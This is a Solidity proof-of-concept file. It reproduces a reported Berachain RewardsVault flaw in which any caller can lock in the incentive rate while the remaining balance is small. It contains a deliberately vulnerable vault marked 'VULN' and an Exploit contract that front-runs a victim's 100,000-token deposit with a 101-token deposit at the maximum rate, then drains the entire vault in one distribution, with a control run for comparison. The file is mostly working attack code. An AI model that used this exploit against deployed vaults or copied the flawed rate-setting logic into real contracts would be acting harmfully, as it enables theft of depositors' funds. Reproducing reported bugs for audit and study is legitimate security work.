// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Berachain RewardsVault.addIncentive lets the caller set incentiveRate when
    amountRemaining <= minIncentiveRate (Spearbit, Oct 2024).
    SYNTHETIC, cheatcode-free, one transaction. The two adds are the sandwich
    the report describes, applied in that order.
    minIncentiveRate = 100 tokens. Attacker deposits 101 tokens at MAX rate.
    Victim then deposits 100,000 tokens at 100 tokens per BGT. The rate stays
    at MAX because remaining is already 101. One block of 0.5 BGT pays
    min(100,101e18, 0.5e18 * 1e36 / 1e18) = 100,101 tokens.
    Control: the victim sets the rate first. The same 0.5 BGT pays 50 tokens. */

contract Incentive {
    string public symbol = "INC";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RewardsVault {
    uint256 public constant PRECISION = 1e18;
    uint256 public constant MAX_RATE = 1e36;
    uint256 public constant MIN_INCENTIVE_RATE = 100 ether;
    Incentive public token;
    uint256 public incentiveRateStored;
    uint256 public amountRemaining;

    constructor(address _token) {
        token = Incentive(_token);
    }

    function addIncentive(uint256 amount, uint256 incentiveRate) external {
        require(incentiveRate <= MAX_RATE, "max");
        require(token.transferFrom(msg.sender, address(this), amount), "pull");
        // @> VULN: any caller can pin the rate while remaining is at or below the minimum
        if (amountRemaining <= MIN_INCENTIVE_RATE && incentiveRate >= MIN_INCENTIVE_RATE) {
            incentiveRateStored = incentiveRate;
        }
        amountRemaining += amount;
    }

    function distributeFor(uint256 bgtEmitted) external returns (uint256 amount) {
        amount = bgtEmitted * incentiveRateStored / PRECISION;
        if (amount > amountRemaining) amount = amountRemaining;
        amountRemaining -= amount;
        require(token.transfer(msg.sender, amount), "pay");
    }
}

contract Harm {
    string public symbol = "SIPHON";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract Exploit {
    uint256 public constant ATTACK_AMT = 101 ether;
    uint256 public constant VICTIM_AMT = 100_000 ether;
    uint256 public constant VICTIM_RATE = 100 ether;
    uint256 public constant BGT = 0.5 ether;
    uint256 public constant MAX_RATE = 1e36;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Harm public harm;
    Incentive public token;
    RewardsVault public buggy;
    RewardsVault public fixedVault;

    uint256 public rateAfterSandwich;
    uint256 public remaining;
    uint256 public drained;
    uint256 public fairPaid;
    uint256 public extra;

    constructor() {
        harm = new Harm();
        token = new Incentive();
        buggy = new RewardsVault(address(token));
        fixedVault = new RewardsVault(address(token));
        token.mint(address(this), ATTACK_AMT + VICTIM_AMT + ATTACK_AMT + VICTIM_AMT);
        token.approve(address(buggy), type(uint256).max);
        token.approve(address(fixedVault), type(uint256).max);
    }

    function run() external {
        require(buggy.amountRemaining() == 0, "empty");
        buggy.addIncentive(ATTACK_AMT, MAX_RATE);
        require(buggy.incentiveRateStored() == MAX_RATE, "pinned");
        require(buggy.amountRemaining() == ATTACK_AMT, "dust deposit");
        buggy.addIncentive(VICTIM_AMT, VICTIM_RATE);
        rateAfterSandwich = buggy.incentiveRateStored();
        require(rateAfterSandwich == MAX_RATE, "rate stuck");
        remaining = buggy.amountRemaining();
        require(remaining == ATTACK_AMT + VICTIM_AMT, "pot");
        drained = buggy.distributeFor(BGT);
        require(drained == ATTACK_AMT + VICTIM_AMT, "drained");
        require(token.balanceOf(address(buggy)) == 0, "vault empty");
        fixedVault.addIncentive(VICTIM_AMT, VICTIM_RATE);
        require(fixedVault.incentiveRateStored() == VICTIM_RATE, "fair rate");
        fairPaid = fixedVault.distributeFor(BGT);
        require(fairPaid == 50 ether, "fair");
        extra = drained - fairPaid;
        require(extra == 100_051 ether, "extra");
        harm.mint(SINK, drained);
        require(harm.balanceOf(SINK) == drained, "marked");
    }
}
